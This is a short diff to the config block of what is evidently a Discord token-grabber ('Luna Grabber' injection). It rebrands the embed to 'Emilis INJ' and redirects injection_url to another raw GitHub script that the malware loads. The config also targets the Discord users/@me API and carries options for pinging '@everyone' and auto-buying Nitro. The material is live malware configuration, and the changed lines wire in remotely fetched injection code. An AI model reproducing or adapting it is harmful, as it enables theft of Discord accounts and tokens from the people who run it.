@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
-  embed_name: 'Luna Injection', 
-  embed_icon: 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096', 
-  embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js', 
+  embed_name: 'Emilis INJ', 
+  embed_icon: 'https://us-tuna-sounds-images.voicemod.net/088e1a6f-aec2-4626-af47-a1ebe25b9be9-1713364693007.png', 
+  embed_color: 14216771, 
+  injection_url: 'https://raw.githubusercontent.com/EmiHackk/efqwfwe/main/injection-clean.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
